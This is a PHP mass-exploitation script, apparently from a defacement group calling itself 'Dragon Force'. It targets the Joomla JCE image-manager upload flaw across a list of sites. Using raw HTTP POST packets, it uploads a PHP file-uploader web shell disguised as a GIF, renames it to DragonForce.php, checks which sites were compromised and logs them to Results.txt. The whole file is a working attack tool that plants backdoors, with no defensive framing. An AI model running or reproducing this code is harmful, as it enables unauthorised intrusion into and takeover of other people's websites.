<?php   
        echo "
    _____         ______         ________ 
   /     |       /      \       /        |
   $$$$$ |      /$$$$$$  |      $$$$$$$$/ 
      $$ |      $$ |  $$/       $$ |__    
 __   $$ |      $$ |            $$    |   
/  |  $$ |      $$ |   __       $$$$$/    
$$ \__$$ |      $$ \__/  |      $$ |_____ 
$$    $$/       $$    $$/       $$       |
 $$$$$$/         $$$$$$/        $$$$$$$$/ 
                                          
                                          
                                          


		\n";
        
 
set_time_limit (0);
 
//apa apa je
$up = '<?php echo "<b>Priv8 Uploaders By Dragon Force<br><br>".php_uname()."<br></b>"; echo "<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">"; echo "<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>"; if( $_POST["_upl"] == "Upload" ) { if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Fuckedz! </b><br><br>"; } else { echo "<b>Failed!  </b><br><br>"; } } ?>';
 
//ni upload dir, ko boleh tukar dir kalau not writeable
$dir = "/";
 
if (!isset ($argv[1]))
        die ("\nUsage : php {$argv[0]} hanat.txt\n");
 
if (!file_exists ($argv[1]))
        die ("\n\"{$argv[1]}\" txt kau mana hanat\n");
 
$site = file ($argv[1]);


$file = fopen ("Results.txt", "a");
$name = "DragonForce.php";
 
foreach ($site as $sites)
{
        $sites = trim ($sites);
        jce_upload ($sites, "/Fuckez By Dragon Force/i".$up, $dir, $name); //ni upload img/gif & oto rename php
 

        if (preg_match ("/Dragon Force/i", @file_get_contents ("$sites/images/stories/$name")))
        {
                echo "Ganyang -> $sites/images/stories/$name\n";
                fwrite ($file, "$sites/images/stories/$name\n");
        }
        elseif (preg_match ("/Dragon Force/i", @file_get_contents ("$site/images/$name")))
        {
                echo "Ganyang -> $site/images/$name\n";
                fwrite ($file, "$sites/images/$name\n");
        }
        elseif (preg_match ("/Dragon Force/i", @file_get_contents ("$site/$name")))
        {
                echo "Ganyang -> $site/$name\n";
                fwrite ($file, "$sites/$name\n");
        }
        else
                echo "Tak vuln hanat -> $sites\n";
}
 
fclose ($file);
 
function jce_upload ($site, $content, $up_dir, $rename)
{
        $host = parse_url ($site, PHP_URL_HOST);
        $path = parse_url ($site, PHP_URL_PATH);
 
        if (!$path)
                $path = "/";
 
        $name = "DragonForce.gif";
 
        $data    = "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-dir\"\r\n\r\n";
        $data   .= "$up_dir\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"\r\n";
        $data   .= "Content-Type: application/octet-stream\r\n\r\n\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n";
        $data   .= "1\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"$name\"\r\n";
        $data   .= "Content-Type: image/gif\r\n\r\n";
        $data   .= "$content\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "0\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
        $data   .= "upload\r\n";
        $data   .= "-----------------------------41184676334--";
 
        $packet = "POST $path/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&action=upload HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*\/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-us,en;q=0.5\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "Connection: Close\r\n";
        $packet .= "Proxy-Connection: close\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n\r\n";
        $packet .= $data;
        $packet .= "\r\n";
 
        send ($host, $packet);
       
        $data = "json={\"fn\":\"folderRename\",\"args\":[\"$up_dir".$name."\",\"$rename\"]}";
       
        $packet  = "POST $path/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-US,en;q=0.8\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "X-Request: JSON\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n";
        $packet .= $data."\r\n\r\n";
       
        send ($host, $packet);
}
 
function send ($host, $packet)
{
        if ($connect = @fsockopen ($host, 80, $x, $y, 3))
        {
                @fputs ($connect, $packet);
                @fclose ($connect);
        }
}
 
?>